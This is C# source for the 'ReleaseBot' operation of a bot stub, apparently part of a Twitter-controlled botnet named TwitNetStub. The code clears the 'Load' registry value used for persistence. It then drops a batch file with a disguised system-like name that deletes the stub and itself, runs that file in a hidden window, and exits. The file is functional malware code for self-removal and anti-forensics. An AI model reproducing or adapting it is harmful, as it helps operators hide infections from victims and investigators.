using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace TwitNetStub.Operations
{
    class ReleaseBotOP : IBotOperation
    {
        public bool Finished { get; set; }

        public ReleaseBotOP()
        {
            
        }

        public void Initialize()
        {

        }
        public void Run()
        {
            try
            {
                RegistryKey RegistryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true);
                if (RegistryKey != null)
                {
                    if (RegistryKey.GetValue("Load").ToString() != "") { RegistryKey.SetValue("Load", ""); }
                }

                //Create a batch script that will delete the stub and itself
                using (StreamWriter BatchScriptWriter = new StreamWriter(Constants.ExecutablePath + "\\msdtcvtr.bat"))
                {
                    BatchScriptWriter.Write("@echo off \ndel {0}\nping 1.1.1.1 -n 1 -w 3000 >NUL \ndel \"%0\"", Constants.FileName);
                    BatchScriptWriter.Close();
                }

                //Run the created batch script and get out of here!
                ProcessStartInfo BatchScript = new ProcessStartInfo(Constants.ExecutablePath + "\\msdtcvtr.bat");
                BatchScript.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(BatchScript);
                Environment.Exit(-1);
            }
            catch (Exception)
            {
                //O SHIT SOMETHING WENT WRONG. Delete the registry key and get out of here!
                RegistryKey RegistryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true);
                if (RegistryKey != null)
                {
                    if (RegistryKey.GetValue("Load").ToString() != "") { RegistryKey.SetValue("Load", ""); }
                }
                Environment.Exit(-1);
            }
        }
    }
}